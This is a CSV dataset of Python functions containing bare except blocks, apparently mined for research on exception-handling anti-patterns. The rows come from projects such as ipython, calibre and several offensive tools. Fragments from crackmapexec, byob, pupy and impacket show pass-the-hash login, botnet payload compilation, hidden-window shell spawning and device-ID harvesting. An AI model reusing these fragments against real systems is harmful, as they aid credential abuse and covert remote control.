,project,file,function,func_body,anti_pattern,count
0,ipython,/home/r4ph/desenv/exception-miner/projects/py/ipython/IPython/core/shellapp.py,_run_cmd_line_code,"def _run_cmd_line_code(self):
        """"""Run code or file specified at the command-line""""""
        if self.code_to_run:
            line = self.code_to_run
            try:
                self.log.info(""Running code given at command line (c=): %s"" %
                              line)
                self.shell.run_cell(line, store_history=False)
            except:
                self.log.warning(""Error in executing line in user namespace: %s"" %
                              line)
                self.shell.showtraceback()
                if not self.interact:
                    self.exit(1)

        # Like Python itself, ignore the second if the first of these is present
        elif self.file_to_run:
            fname = self.file_to_run
            if os.path.isdir(fname):
                fname = os.path.join(fname, ""__main__.py"")
            if not os.path.exists(fname):
                self.log.warning(""File '%s' doesn't exist"", fname)
                if not self.interact:
                    self.exit(2)
            try:
                self._exec_file(fname, shell_futures=True)
            except:
                self.shell.showtraceback(tb_offset=4)
                if not self.interact:
                    self.exit(1)",Bare Except Catch Block,1
1,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/pupy/pstore.py,__init__,"def __init__(self, pstore_dir='~'):
        try:
            import getpass
            uid = getpass.getuser()
        except:
            if hasattr(os, 'getuid'):
                uid = os.getuid()
            else:
                uid = ''

        seed = '{}:{}'.format(uid, uuid.getnode())

        h = hashlib.sha1()
        h.update(seed)

        if os.name == 'posix':
            if pstore_dir == '~':
                pstore_dir = os.path.join(pstore_dir, '.cache')
            pstore_name = '.{}'.format(h.hexdigest())
        else:
            if pstore_dir == '~':
                pstore_dir = os.path.join(
                    pstore_dir, 'AppData', 'Local', 'Temp'
                )
            pstore_name = h.hexdigest()

        self._pstore_path = os.path.expanduser(
            os.path.join(pstore_dir, pstore_name)
        )

        h = hashlib.sha1()
        h.update('password' + seed)

        self._pstore_key = (h.digest()[:16], '\x00'*16)
        self._pstore = {}

        self.load()",Bare Except Catch Block,1
2,paramiko,/home/r4ph/desenv/phd/exception-miner/projects/py/paramiko/paramiko/primes.py,read_file,"def read_file(self, filename):
        """"""
        :raises IOError: passed from any file operations that fail.
        """"""
        self.pack = {}
        with open(filename, ""r"") as f:
            for line in f:
                line = line.strip()
                if (len(line) == 0) or (line[0] == ""#""):
                    continue
                try:
                    self._parse_modulus(line)
                except:
                    continue",Bare Except Catch Block,1
3,impacket,/home/r4ph/desenv/phd/exception-miner/projects/py/impacket/examples/DumpNTLMInfo.py,Authenticate,"def Authenticate(self):
        packet = SMB2Packet()
        if self.GetNegotiateResponse()['DialectRevision'] >= SMB2_DIALECT_30:
            packet = SMB3Packet()
        packet['Command'] = SMB2_SESSION_SETUP

        if self._answer.isValidAnswer(STATUS_MORE_PROCESSING_REQUIRED):
            self._sessionId = self._answer['SessionID']
            type3, _ = ntlm.getNTLMSSPType3(self._auth, self._respToken['ResponseToken'], '', '', '', '', '')

            respToken2 = SPNEGO_NegTokenResp()
            respToken2['ResponseToken'] = type3.getData()

            sessionSetup = SMB2SessionSetup()
            sessionSetup['SecurityMode'] = SMB2_NEGOTIATE_SIGNING_ENABLED
            sessionSetup['SecurityBufferLength'] = len(respToken2)
            sessionSetup['Buffer'] = respToken2.getData()
            packet['Data'] = sessionSetup

            self.send(packet)
            packet = self.receive()

            try:
                return packet.isValidAnswer(STATUS_SUCCESS)
            except:
                return False",Bare Except Catch Block,1
4,quantaxis,/home/r4ph/desenv/phd/exception-miner/projects/py/quantaxis/QUANTAXIS/QASU/save_tdx.py,__saving_work,"def __saving_work(code, coll):

        QA_util_log_info(
            '##JOB07 Now Saving ETF_MIN ==== {}'.format(str(code)),
            ui_log=ui_log
        )
        try:

            for type in ['1min', '5min', '15min', '30min', '60min']:
                ref_ = coll.find({'code': str(code)[0:6], 'type': type})
                end_time = str(now_time())[0:19]
                if ref_.count() > 0:
                    start_time = ref_[ref_.count() - 1]['datetime']

                    QA_util_log_info(
                        '##JOB07.{} Now Saving {} from {} to {} =={} '.format(
                            ['1min',
                             '5min',
                             '15min',
                             '30min',
                             '60min'].index(type),
                            str(code),
                            start_time,
                            end_time,
                            type
                        ),
                        ui_log=ui_log
                    )

                    if start_time != end_time:
                        __data = QA_fetch_get_index_min(
                            str(code),
                            start_time,
                            end_time,
                            type
                        )
                        if len(__data) > 1:
                            coll.insert_many(
                                QA_util_to_json_from_pandas(__data[1::])
                            )
                else:
                    start_time = '2015-01-01'

                    QA_util_log_info(
                        '##JOB07.{} Now Saving {} from {} to {} =={} '.format(
                            ['1min',
                             '5min',
                             '15min',
                             '30min',
                             '60min'].index(type),
                            str(code),
                            start_time,
                            end_time,
                            type
                        ),
                        ui_log=ui_log
                    )

                    if start_time != end_time:
                        __data = QA_fetch_get_index_min(
                            str(code),
                            start_time,
                            end_time,
                            type
                        )
                        if len(__data) > 1:
                            coll.insert_many(
                                QA_util_to_json_from_pandas(__data)
                            )
        except:
            err.append(code)",Bare Except Catch Block,1
5,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/utils/ipc/simple_worker.py,run_job,"def run_job(
        mod_name, func_name, args=(), kwargs=None, timeout=300,  # seconds
        no_output=False, heartbeat=None, abort=None, module_is_source_code=False
    ):
        ans = {'result':None, 'stdout_stderr':None}
        kwargs = kwargs or {}
        try:
            communicate(ans, w, conn, (mod_name, func_name, args, kwargs,
                module_is_source_code), timeout=timeout, heartbeat=heartbeat,
                abort=abort)
        except WorkerError as e:
            if not no_output:
                e.log_path = w.log_path
            raise
        finally:
            t = Thread(target=w.kill)
            t.daemon=True
            t.start()
            if no_output:
                try:
                    os.remove(w.log_path)
                except:
                    pass
        if not no_output:
            ans['stdout_stderr'] = w.log_path
        return ans",Bare Except Catch Block,1
6,paddlehub,/home/r4ph/desenv/phd/exception-miner/projects/py/paddlehub/modules/image/classification/vgg16_imagenet/module.py,_set_config,"def _set_config(self):
        """"""
        predictor config setting
        """"""
        cpu_config = AnalysisConfig(self.default_pretrained_model_path)
        cpu_config.disable_glog_info()
        cpu_config.disable_gpu()
        cpu_config.switch_ir_optim(False)
        self.cpu_predictor = create_paddle_predictor(cpu_config)

        try:
            _places = os.environ[""CUDA_VISIBLE_DEVICES""]
            int(_places[0])
            use_gpu = True
        except:
            use_gpu = False
        if use_gpu:
            gpu_config = AnalysisConfig(self.default_pretrained_model_path)
            gpu_config.disable_glog_info()
            gpu_config.enable_use_gpu(memory_pool_init_size_mb=500, device_id=0)
            self.gpu_predictor = create_paddle_predictor(gpu_config)",Bare Except Catch Block,1
7,quantaxis,/home/r4ph/desenv/phd/exception-miner/projects/py/quantaxis/QUANTAXIS/QASU/save_tdx.py,__saving_work,"def __saving_work(code, coll_stock_year):
        try:
            QA_util_log_info(
                '##JOB01 Now Saving STOCK_YEAR==== {}'.format(str(code)),
                ui_log=ui_log
            )

            ref = coll_stock_year.find({'code': str(code)[0:6]})
            end_date = str(now_time())[0:10]
            if ref.count() > 0:
                # 加入这个判断的原因是因为如果股票是刚上市的 数据库会没有数据 所以会有负索引问题出现

                start_date = ref[ref.count() - 1]['date']

                QA_util_log_info(
                    'UPDATE_STOCK_YEAR \n Trying updating {} from {} to {}'
                        .format(code,
                                start_date,
                                end_date),
                    ui_log=ui_log
                )
                if start_date != end_date:
                    coll_stock_year.insert_many(
                        QA_util_to_json_from_pandas(
                            QA_fetch_get_stock_day(
                                str(code),
                                QA_util_get_next_day(start_date),
                                end_date,
                                '00',
                                frequence='year'
                            )
                        )
                    )
            else:
                start_date = '1990-01-01'
                QA_util_log_info(
                    'UPDATE_STOCK_YEAR \n Trying updating {} from {} to {}'
                        .format(code,
                                start_date,
                                end_date),
                    ui_log=ui_log
                )
                if start_date != end_date:
                    coll_stock_year.insert_many(
                        QA_util_to_json_from_pandas(
                            QA_fetch_get_stock_day(
                                str(code),
                                start_date,
                                end_date,
                                '00',
                                frequence='year'
                            )
                        )
                    )
        except:
            err.append(str(code))",Bare Except Catch Block,1
8,crackmapexec,/home/r4ph/desenv/phd/exception-miner/projects/py/crackmapexec/cme/protocols/mssql.py,hash_login,"def hash_login(self, domain, username, ntlm_hash):
        lmhash = """"
        nthash = """"

        # This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find("":"") != -1:
            lmhash, nthash = ntlm_hash.split("":"")
        else:
            nthash = ntlm_hash

        try:
            self.conn.disconnect()
        except:
            pass
        self.create_conn_obj()

        try:
            res = self.conn.login(
                None,
                username,
                """",
                domain,
                "":"" + nthash if not lmhash else ntlm_hash,
                not self.args.local_auth,
            )
            if res is not True:
                self.conn.printReplies()
                return False

            self.hash = ntlm_hash
            self.username = username
            self.domain = domain
            self.check_if_admin()
            self.db.add_credential(""hash"", domain, username, ntlm_hash)

            if self.admin_privs:
                self.db.add_admin_user(""hash"", domain, username, ntlm_hash, self.host)

            out = f""{domain}\\{username} {process_secret(ntlm_hash)} {self.mark_pwned()}""
            self.logger.success(out)
            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True
        except BrokenPipeError as e:
            self.logger.fail(f""Broken Pipe Error while attempting to login"")
            return False
        except Exception as e:
            self.logger.fail(f""{domain}\\{username}:{process_secret(ntlm_hash)} {e}"")
            return False",Bare Except Catch Block,1
9,gooey,/home/r4ph/desenv/exception-miner/projects/py/gooey/gooey/gui/util/time.py,format_interval,"def format_interval(timeValue):
    """"""
    Formats a number of seconds as a clock time, [H:]MM:SS
    Parameters
    ----------
    t  : int
        Number of seconds.
    Returns
    -------
    out  : str
        [H:]MM:SS
    """"""
    # https://github.com/tqdm/tqdm/blob/0cd9448b2bc08125e74538a2aea6af42ee1a7b6f/tqdm/std.py#L228
    try:
        mins, s = divmod(int(timeValue), 60)
        h, m = divmod(mins, 60)
        if h:
            return '{0:d}:{1:02d}:{2:02d}'.format(h, m, s)
        else:
            return '{0:02d}:{1:02d}'.format(m, s)
    except:
        return None",Bare Except Catch Block,1
10,searx,/home/r4ph/desenv/phd/exception-miner/projects/py/searx/searx/engines/__init__.py,load_engine,"def load_engine(engine_data):
    engine_name = engine_data['name']
    if '_' in engine_name:
        logger.error('Engine name contains underscore: ""{}""'.format(engine_name))
        sys.exit(1)

    if engine_name.lower() != engine_name:
        logger.warn('Engine name is not lowercase: ""{}"", converting to lowercase'.format(engine_name))
        engine_name = engine_name.lower()
        engine_data['name'] = engine_name

    engine_module = engine_data['engine']

    try:
        engine = load_module(engine_module + '.py', engine_dir)
    except (SyntaxError, KeyboardInterrupt, SystemExit, SystemError, ImportError, RuntimeError):
        logger.exception('Fatal exception in engine ""{}""'.format(engine_module))
        sys.exit(1)
    except:
        logger.exception('Cannot load engine ""{}""'.format(engine_module))
        return None

    for param_name, param_value in engine_data.items():
        if param_name == 'engine':
            pass
        elif param_name == 'categories':
            if param_value == 'none':
                engine.categories = []
            else:
                engine.categories = list(map(str.strip, param_value.split(',')))
        elif param_name == 'proxies':
            engine.proxies = get_proxy_cycles(param_value)
        else:
            setattr(engine, param_name, param_value)

    for arg_name, arg_value in engine_default_args.items():
        if not hasattr(engine, arg_name):
            setattr(engine, arg_name, arg_value)

    # checking required variables
    for engine_attr in dir(engine):
        if engine_attr.startswith('_'):
            continue
        if engine_attr == 'inactive' and getattr(engine, engine_attr) is True:
            return None
        if getattr(engine, engine_attr) is None:
            logger.error('Missing engine config attribute: ""{0}.{1}""'
                         .format(engine.name, engine_attr))
            sys.exit(1)

    # assign supported languages from json file
    if engine_data['engine'] in ENGINES_LANGUAGES:
        setattr(engine, 'supported_languages', ENGINES_LANGUAGES[engine_data['engine']])

    # find custom aliases for non standard language codes
    if hasattr(engine, 'supported_languages'):
        if hasattr(engine, 'language_aliases'):
            language_aliases = getattr(engine, 'language_aliases')
        else:
            language_aliases = {}

        for engine_lang in getattr(engine, 'supported_languages'):
            iso_lang = match_language(engine_lang, babel_langs, fallback=None)
            if iso_lang and iso_lang != engine_lang and not engine_lang.startswith(iso_lang) and \
               iso_lang not in getattr(engine, 'supported_languages'):
                language_aliases[iso_lang] = engine_lang

        setattr(engine, 'language_aliases', language_aliases)

    # language_support
    setattr(engine, 'language_support', len(getattr(engine, 'supported_languages', [])) > 0)

    # assign language fetching method if auxiliary method exists
    if hasattr(engine, '_fetch_supported_languages'):
        headers = {
            'User-Agent': gen_useragent(),
            'Accept-Language': 'ja-JP,ja;q=0.8,en-US;q=0.5,en;q=0.3',  # bing needs a non-English language
        }
        setattr(engine, 'fetch_supported_languages',
                lambda: engine._fetch_supported_languages(get(engine.supported_languages_url, headers=headers)))

    engine.stats = {
        'sent_search_count': 0,  # sent search
        'search_count': 0,  # successful search
        'result_count': 0,
        'engine_time': 0,
        'engine_time_count': 0,
        'score_count': 0,
        'errors': 0
    }

    engine_type = getattr(engine, 'engine_type', 'online')

    if engine_type != 'offline':
        engine.stats['page_load_time'] = 0
        engine.stats['page_load_count'] = 0

    # tor related settings
    if settings['outgoing'].get('using_tor_proxy'):
        # use onion url if using tor.
        if hasattr(engine, 'onion_url'):
            engine.search_url = engine.onion_url + getattr(engine, 'search_path', '')
    elif 'onions' in engine.categories:
        # exclude onion engines if not using tor.
        return None

    engine.timeout += settings['outgoing'].get('extra_proxy_timeout', 0)

    for category_name in engine.categories:
        categories.setdefault(category_name, []).append(engine)

    if engine.shortcut in engine_shortcuts:
        logger.error('Engine config error: ambiguous shortcut: {0}'.format(engine.shortcut))
        sys.exit(1)

    engine_shortcuts[engine.shortcut] = engine.name

    return engine",Bare Except Catch Block,1
11,paddlehub,/home/r4ph/desenv/phd/exception-miner/projects/py/paddlehub/paddlehub/utils/parser.py,parse,"def parse(self, txt_file: str, use_strip: bool = True) -> List:
        contents = []
        try:
            with codecs.open(txt_file, 'r', encoding='utf8') as file:
                for line in file:
                    if use_strip:
                        line = line.strip()
                    if line:
                        contents.append(line)
        except:
            with codecs.open(txt_file, 'r', encoding='gbk') as file:
                for line in file:
                    if use_strip:
                        line = line.strip()
                    if line:
                        contents.append(line)
        return contents",Bare Except Catch Block,1
12,fairseq,/home/r4ph/desenv/exception-miner/projects/py/fairseq/fairseq_cli/hydra_train.py,cli_main,"def cli_main():
    try:
        from hydra._internal.utils import get_args

        cfg_name = get_args().config_name or ""config""
    except:
        logger.warning(""Failed to get config name from hydra args"")
        cfg_name = ""config""

    hydra_init(cfg_name)
    hydra_main()",Bare Except Catch Block,1
13,byob,/home/r4ph/desenv/phd/exception-miner/projects/py/byob/web-gui/buildyourownbotnet/core/generators.py,freeze,"def freeze(filename, icon=None, hidden=None, owner=None, operating_system=None, architecture=None):
    """"""
    Compile a Python file into a standalone executable
    binary with a built-in Python interpreter

    `Required`
    :param str icon:        icon image filename
    :param str filename:    target filename

    Returns output filename as a string

    """"""
    global template_spec

    # remember current working directory to return later
    original_dir = os.getcwd()

    basename = os.path.basename(filename)
    name = os.path.splitext(basename)[0]
    path = os.path.splitdrive(os.path.abspath('.'))[1].replace('\\','/')

    # add user/owner output path if provided
    if owner:
        path = path + '/output/' + owner + '/src'

    key = ''.join([random.choice([chr(i) for i in list(range(48,91)) + list(range(97,123))]) for _ in range(16)])

    imports = ['imp']
    with open(filename) as import_file:
        for potental_import in filter(None, (PI.strip().split() for PI in import_file)):
            if potental_import[0] == 'import':
                imports.append(potental_import[1].split(';')[0].split(','))

    bad_imports = set()
    bad_imports.add('core')
    for i in os.listdir('core'):
        i = os.path.splitext(i)[0]
        bad_imports.add(i)
        bad_imports.add('core.%s' % i)

    for imported in imports:
        if isinstance(imported, list):
            __ = imports.pop(imports.index(imported))
            for ___ in __:
                if ___ not in bad_imports:
                    imports.append(___)

    imports = list(set(imports))
    if isinstance(hidden, list):
        imports.extend(hidden)

    # hacky fix https://stackoverflow.com/questions/61574984/no-module-named-pkg-resources-py2-warn-pyinstaller
    imports.append('pkg_resources.py2_warn')

    spec = template_spec.substitute(BASENAME=repr(basename), PATH=repr(path), IMPORTS=imports, NAME=repr(name), ICON=repr(icon))
    fspec = os.path.join(path, name + '.spec')

    with open(fspec, 'w') as fp:
        fp.write(spec)

    # copy requirements to 
    shutil.copy('requirements_client.txt', path + '/requirements.txt')

    # cd into user's src directory (limitation of pyinstaller docker)
    os.chdir(path)

    # cross-compile executable for the specified os/arch using pyinstaller docker containers
    process = subprocess.Popen('docker run -v ""$(pwd):/src/"" {docker_container}'.format(
                                src_path=os.path.dirname(path), 
                                docker_container=operating_system + '-' + architecture), 
                                0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, 
                                cwd=path, 
                                shell=True)

    start_time = time.time()

    # wait for compilation to finish or hit 10 minute time limit
    while True:
        try:
            line = process.stderr.readline().rstrip()
        except: 
            break
        if line.strip() != None:
            util.display(line, color='reset', style='dim')
            line = line.decode('utf-8')
            if 'EXE' in line and 'complete' in line:
                break
        time.sleep(0.25)

        if (time.time() - start_time > 600):
            raise RuntimeError(""Timeout or out of memory"")

    output = os.path.join(path, 'dist', 'windows/{0}.exe'.format(name) if operating_system == 'win' else 'linux/{0}'.format(name))

    # remove temporary files (.py, .spec)
    os.remove(basename)
    os.remove(name + '.spec')

    # return to original directory
    os.chdir(original_dir)

    return output",Bare Except Catch Block,1
14,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/devices/smart_device_app/driver.py,_check_if_format_send_needed,"def _check_if_format_send_needed(self, db, id_, book):
        if not self.will_ask_for_update_books:
            return (None, False)

        from calibre.utils.date import isoformat, parse_date
        try:
            if not hasattr(book, '_format_mtime_'):
                return (None, False)

            ext = posixpath.splitext(book.lpath)[1][1:]
            fmt_metadata = db.new_api.format_metadata(id_, ext)
            if fmt_metadata:
                calibre_mtime = fmt_metadata['mtime']
                if calibre_mtime > self.now:
                    if not self.have_sent_future_dated_book_message:
                        self.have_sent_future_dated_book_message = True
                        self._show_message(_('You have book formats in your library '
                                             'with dates in the future. See calibre '
                                             'for details'))
                    return (None, True)

                cc_mtime = parse_date(book.get('_format_mtime_'), as_utc=True)
                self._debug(book.title, 'cal_mtime', calibre_mtime, 'cc_mtime', cc_mtime)
                if cc_mtime < calibre_mtime:
                    book.set('_format_mtime_', isoformat(self.now))
                    return (posixpath.basename(book.lpath), False)
        except:
            self._debug('exception checking if must send format', book.title)
            traceback.print_exc()
        return (None, False)",Bare Except Catch Block,1
15,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/utils/formatter_functions.py,evaluate,"def evaluate(self, formatter, kwargs, mi, locals, val, start_index, end_index):
        if not val:
            return ''
        si = int(start_index)
        ei = int(end_index)
        has_periods = '.' in val
        items = [v.strip() for v in val.split(',') if v.strip()]
        rv = set()
        for item in items:
            if has_periods and '.' in item:
                components = self.period_pattern.split(item)
            else:
                components = [item]
            try:
                if ei == 0:
                    t = '.'.join(components[si:]).strip()
                else:
                    t = '.'.join(components[si:ei]).strip()
                if t:
                    rv.add(t)
            except:
                pass
        return ', '.join(sorted(rv, key=sort_key))",Bare Except Catch Block,1
16,sygil-webui,/home/r4ph/desenv/phd/exception-miner/projects/py/sygil-webui/webui/streamlit/scripts/sd_utils/__init__.py,run,"def run(self):
        try:
            pynvml.nvmlInit()
        except:
            logger.debug(
                f""[{self.name}] Unable to initialize NVIDIA management. No memory stats. \n""
            )
            return
        logger.info(f""[{self.name}] Recording memory usage...\n"")
        # Missing context
        # handle = pynvml.nvmlDeviceGetHandleByIndex(st.session_state['defaults'].general.gpu)
        handle = pynvml.nvmlDeviceGetHandleByIndex(0)
        self.total = pynvml.nvmlDeviceGetMemoryInfo(handle).total
        while not self.stop_flag:
            m = pynvml.nvmlDeviceGetMemoryInfo(handle)
            self.max_usage = max(self.max_usage, m.used)
            # logger.info(self.max_usage)
            time.sleep(0.1)
        logger.info(f""[{self.name}] Stopped recording.\n"")
        pynvml.nvmlShutdown()",Bare Except Catch Block,1
17,crackmapexec,/home/r4ph/desenv/phd/exception-miner/projects/py/crackmapexec/cme/protocols/smb/smbexec.py,finish,"def finish(self):
        # Just in case the service is still created
        try:
            self.__scmr = self.__rpctransport.get_dce_rpc()
            self.__scmr.connect()
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp[""lpScHandle""]
            resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
            service = resp[""lpServiceHandle""]
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except:
            pass",Bare Except Catch Block,1
18,keras-yolo3,/home/r4ph/desenv/phd/exception-miner/projects/py/keras-yolo3/yolo.py,generate,"def generate(self):
        model_path = os.path.expanduser(self.model_path)
        assert model_path.endswith('.h5'), 'Keras model or weights must be a .h5 file.'

        # Load model, or construct model and load weights.
        num_anchors = len(self.anchors)
        num_classes = len(self.class_names)
        is_tiny_version = num_anchors==6 # default setting
        try:
            self.yolo_model = load_model(model_path, compile=False)
        except:
            self.yolo_model = tiny_yolo_body(Input(shape=(None,None,3)), num_anchors//2, num_classes) \
                if is_tiny_version else yolo_body(Input(shape=(None,None,3)), num_anchors//3, num_classes)
            self.yolo_model.load_weights(self.model_path) # make sure model, anchors and classes match
        else:
            assert self.yolo_model.layers[-1].output_shape[-1] == \
                num_anchors/len(self.yolo_model.output) * (num_classes + 5), \
                'Mismatch between model and given anchor and class sizes'

        print('{} model, anchors, and classes loaded.'.format(model_path))

        # Generate colors for drawing bounding boxes.
        hsv_tuples = [(x / len(self.class_names), 1., 1.)
                      for x in range(len(self.class_names))]
        self.colors = list(map(lambda x: colorsys.hsv_to_rgb(*x), hsv_tuples))
        self.colors = list(
            map(lambda x: (int(x[0] * 255), int(x[1] * 255), int(x[2] * 255)),
                self.colors))
        np.random.seed(10101)  # Fixed seed for consistent colors across runs.
        np.random.shuffle(self.colors)  # Shuffle colors to decorrelate adjacent classes.
        np.random.seed(None)  # Reset seed to default.

        # Generate output tensor targets for filtered bounding boxes.
        self.input_image_shape = K.placeholder(shape=(2, ))
        if self.gpu_num>=2:
            self.yolo_model = multi_gpu_model(self.yolo_model, gpus=self.gpu_num)
        boxes, scores, classes = yolo_eval(self.yolo_model.output, self.anchors,
                len(self.class_names), self.input_image_shape,
                score_threshold=self.score, iou_threshold=self.iou)
        return boxes, scores, classes",Bare Except Catch Block,1
19,cython,/home/r4ph/desenv/phd/exception-miner/projects/py/cython/tests/run/test_asyncgen.py,gen,"async def gen():
            nonlocal DONE
            try:
                yield
            except:
                pass
            yield
            DONE += 1",Bare Except Catch Block,1
20,spyder,/home/r4ph/desenv/phd/exception-miner/projects/py/spyder/external-deps/spyder-kernels/spyder_kernels/console/kernel.py,_is_image,"def _is_image(self, var):
        """"""Return True if variable is a PIL.Image image""""""
        try:
            from PIL import Image
            return isinstance(var, Image.Image)
        except:
            return False",Bare Except Catch Block,1
21,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/packages/android/pupydroid/utils.py,getDeviceId,"def getDeviceId():
    '''
    Returns the unique device ID, for example, the IMEI for GSM and the MEID or ESN for CDMA phones.
    Otherwise, returns None
    Requires Permission: READ_PHONE_STATE
    '''
    try:
        telephonyManager = cast(
            'android.telephony.TelephonyManager',
            SERVICE.getSystemService(CONTEXT.TELEPHONY_SERVICE))
        deviceId = telephonyManager.getDeviceId()
        return deviceId
    except:
        return None",Bare Except Catch Block,1
22,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/utils/formatter_functions.py,evaluate,"def evaluate(self, formatter, kwargs, mi, locals, a):
        try:
            return len(a)
        except:
            return -1",Bare Except Catch Block,1
23,numpy-ml,/home/r4ph/desenv/phd/exception-miner/projects/py/numpy-ml/docs/conf.py,linkcode_resolve,"def linkcode_resolve(domain, info):
    if domain != ""py"":
        return None

    module = info.get(""module"", None)
    fullname = info.get(""fullname"", None)

    if not module or not fullname:
        return None

    obj = sys.modules.get(module, None)
    if obj is None:
        return None

    for part in fullname.split("".""):
        obj = getattr(obj, part)
        if isinstance(obj, property):
            obj = obj.fget

    try:
        file = inspect.getsourcefile(obj)
        if file is None:
            return None
    except:
        return None

    file = os.path.relpath(file, start=os.path.abspath(""..""))
    source, line_start = inspect.getsourcelines(obj)
    line_end = line_start + len(source) - 1
    filename = f""{file}#L{line_start}-L{line_end}""
    return f""{gh_url}/blob/master/{filename}""",Bare Except Catch Block,1
24,pattern,/home/r4ph/desenv/phd/exception-miner/projects/py/pattern/pattern/vector/__init__.py,classify,"def classify(self, document, discrete=True):
        """""" Returns the type with the highest probability for the given document.
            If the classifier has been trained on LSA concept vectors
            you need to supply LSA.transform(document).
        """"""
        v = self._vector(document)[1]
        i = self._iteration or 1
        i = float(i)
        p = defaultdict(float)
        for type, w in self._weight.items():
            #p[type] = sum(w[f][0] for f in v if f in w) # Without averaging.
            s = 0.
            for f in v:
                if f in w:
                    w0, w1, j = w[f]
                    s += ((i - j) * w0 + w1) / i
            p[type] = s
        # Normalize probability estimates.
        p = softmax(p)
        #m = min(chain(p.values(), (0,)))
        #s = sum(x-m for x in p.values()) or 1
        #for type in p:
        #    p[type] -= m
        #    p[type] /= s
        if not discrete:
            return Probabilities(self, p)
        try:
            # Ties are broken in favor of the majority class
            # (random winner for majority ties).
            m = max(p.values())
            p = sorted((self._classes[type], type) for type, w in p.items() if w == m > 0)
            p = [type for frequency, type in p if frequency == p[0][0]]
            return choice(p)
        except:
            return self.baseline",Bare Except Catch Block,1
25,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/packages/all/interactive_shell.py,interactive_open,"def interactive_open(program=None, encoding=None):
    try:
        if program is None:
            if sys.platform==""win32"":
                program=""cmd.exe""
            else:
                if ""SHELL"" in os.environ:
                    program=os.environ[""SHELL""]
                else:
                    program=""/bin/sh""
                encoding=None

        fullargs=[program]
        if sys.platform==""win32"":
            try:
                #couldn't find a better way, none of the following methods worked for me : kernel32.SetConsoleOutputCP(), locale.getpreferredencoding(), sys.stdout.encoding
                encoding=""cp""+str(re.findall(r"".*:\s*([0-9]+)"",subprocess.check_output(""chcp"", shell=True))[0])
            except:
                pass
            if program.endswith(""powershell"") or program.endswith(""powershell.exe""):
                fullargs=[""powershell.exe"", ""-C"", ""-""] # trick to make powershell work without blocking
        if encoding is None:
            encoding=locale.getpreferredencoding()
        print ""Opening interactive %s (with encoding %s)...""%(program,encoding)
        if sys.platform==""win32"":
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags = subprocess.CREATE_NEW_CONSOLE | subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            p = Popen(fullargs, stdout=PIPE, stderr=PIPE, stdin=PIPE, bufsize=0, close_fds=ON_POSIX, universal_newlines=True, startupinfo=startupinfo)
        else:
            p = Popen(fullargs, stdout=PIPE, stderr=PIPE, stdin=PIPE, bufsize=0, close_fds=ON_POSIX, universal_newlines=True)
        q = Queue()
        q2 = Queue()
        t = Thread(target=write_output, args=(p.stdout, q))
        t.daemon = True
        t.start()

        t = Thread(target=write_output, args=(p.stderr, q2))
        t.daemon = True
        t.start()

        t = Thread(target=flush_loop, args=(q, encoding))
        t.daemon = True
        t.start()

        t = Thread(target=flush_loop, args=(q2, encoding))
        t.daemon = True
        t.start()

        while True:
            line = raw_input()
            p.stdin.write(line+""\n"")
            p.stdin.flush()
            if line.strip()==""exit"":
                break
    except:
        print(traceback.format_exc())
        raise",Bare Except Catch Block,1
26,impacket,/home/r4ph/desenv/phd/exception-miner/projects/py/impacket/impacket/dcerpc/v5/ndr.py,pack,"def pack(self, fieldName, fieldTypeOrClass, soFar = 0):
        if isinstance(self.fields[fieldName], NDR):
            return self.fields[fieldName].getData(soFar)

        data = self.fields[fieldName]
        # void specifier
        if fieldTypeOrClass[:1] == '_':
            return b''

        # code specifier
        two = fieldTypeOrClass.split('=')
        if len(two) >= 2:
            try:
                return self.pack(fieldName, two[0], soFar)
            except:
                self.fields[fieldName] = eval(two[1], {}, self.fields)
                return self.pack(fieldName, two[0], soFar)

        if data is None:
            raise Exception('Trying to pack None')

        # literal specifier
        if fieldTypeOrClass[:1] == ':':
            if hasattr(data, 'getData'):
                return data.getData()
            return data

        # struct like specifier
        return pack(fieldTypeOrClass, data)",Bare Except Catch Block,1
27,impacket,/home/r4ph/desenv/phd/exception-miner/projects/py/impacket/impacket/smb.py,kerberos_login,"def kerberos_login(self, user, password, domain = '', lmhash = '', nthash = '', aesKey = '', kdcHost = '', TGT=None, TGS=None):
        # Importing down here so pyasn1 is not required if kerberos is not used.
        from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal, KerberosTime, Ticket
        from pyasn1.codec.der import decoder, encoder
        import datetime

        # login feature does not support unicode
        # disable it if enabled
        flags2 = self.__flags2
        if flags2 & SMB.FLAGS2_UNICODE:
            self.__flags2 = flags2 & (flags2 ^ SMB.FLAGS2_UNICODE)

        # If TGT or TGS are specified, they are in the form of:
        # TGS['KDC_REP'] = the response from the server
        # TGS['cipher'] = the cipher used
        # TGS['sessionKey'] = the sessionKey
        # If we have hashes, normalize them
        if lmhash != '' or nthash != '':
            if len(lmhash) % 2:
                lmhash = '0%s' % lmhash
            if len(nthash) % 2:
                nthash = '0%s' % nthash
            try: # just in case they were converted already
                lmhash = a2b_hex(lmhash)
                nthash = a2b_hex(nthash)
            except:
                pass

        self.__userName = user
        self.__password = password
        self.__domain   = domain
        self.__lmhash   = lmhash
        self.__nthash   = nthash
        self.__aesKey   = aesKey
        self.__kdc      = kdcHost
        self.__TGT      = TGT
        self.__TGS      = TGS
        self._doKerberos= True

        # First of all, we need to get a TGT for the user
